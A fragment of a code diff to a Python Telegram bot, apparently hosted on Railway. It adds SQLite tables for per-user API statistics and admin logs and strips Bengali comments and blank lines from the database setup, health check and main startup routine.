+            await db.execute("CREATE TABLE IF NOT EXISTS user_api_stats (user_id INTEGER, api_name INTEGER, total_calls INTEGER DEFAULT 0, last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, api_name))")
+            await db.execute("CREATE TABLE IF NOT EXISTS admin_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, admin_id INTEGER, action TEXT, target_id INTEGER, details TEXT, log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
             await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('FREE50', 50, 100, ?)", (ADMIN_ID,))
             await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('WELCOME10', 10, 200, ?)", (ADMIN_ID,))
             await db.commit()
@@ -903,9 +709,7 @@ async def init_db():
     except Exception as e:
         logger.error(f"Database init error: {e}")
 
-# ===================== হেলথ চেক (ওয়েবহুকের জন্য) =====================
 async def health_check():
-    """শুধু Railway-এর জন্য /health এন্ডপয়েন্ট (ঐচ্ছিক)"""
     from aiohttp import web
     app = web.Application()
     async def handle(request):
@@ -919,7 +723,6 @@ async def health_check():
     while True:
         await asyncio.sleep(3600)
 
-# ===================== মেইন =====================
 async def main():
     try:
         print("="*60)
@@ -928,23 +731,15 @@ async def main():
         print(f"👑 Admin ID: {ADMIN_ID}")
         print(f"📁 Database: {DB_PATH}")
         print("="*60)
-
         await init_db()
-
-        # ব্যাকগ্রাউন্ড টাস্ক: ডেটাবেস ব্যাকআপ (প্রতি ৬ ঘণ্টা)
         asyncio.create_task(backup_database())
-
-        # (ঐচ্ছিক) হেলথ চেক সার্ভার – Railway-এর জন্য
         asyncio.create_task(health_check())
-
         application = Application.builder().token(BOT_TOKEN).build()
         application.add_handler(CommandHandler("start", start))
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-
         print("✅ Bot is RUNNING!")
         print("="*60)
         await application.run_polling()
-
     except Exception as e:
         logger.error(f"Main error: {e}")
         print(f"❌ Error: {e}")
